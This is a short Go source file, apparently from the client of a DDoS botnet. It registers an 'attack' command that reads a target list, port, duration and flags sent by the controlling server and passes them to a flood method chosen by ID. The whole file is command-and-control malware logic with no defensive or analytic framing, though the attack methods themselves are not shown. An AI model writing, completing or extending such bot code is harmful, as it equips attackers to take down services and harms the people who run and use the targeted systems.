package cmdImpl

import (
	"client/core/config"
	"client/core/modules/commands"
	"client/core/modules/methods"
	"log"
)

func init() {
	commands.Make(&commands.Command{
		Id: 1,
		Executor: func(client config.Client) error {
			log.Println("(cmdImpl/attack.go) Received an attack command.")

			type AttackCommand struct {
				ID       int
				Targets  []string
				Port     int
				Duration int
				Flags    map[int]interface{}
			}

			var attack = &AttackCommand{}

			err := client.Connection.ReadObject(&attack)
			if err != nil {
				return err
			}

			log.Println("(cmdImpl/attack.go) Parsed target, port, duration, flags. Starting attack..")
			err = methods.Get(attack.ID).Executor(attack.Targets, attack.Port, attack.Duration, attack.Flags)
			if err != nil {
				return err
			}

			return nil
		},
	})
}
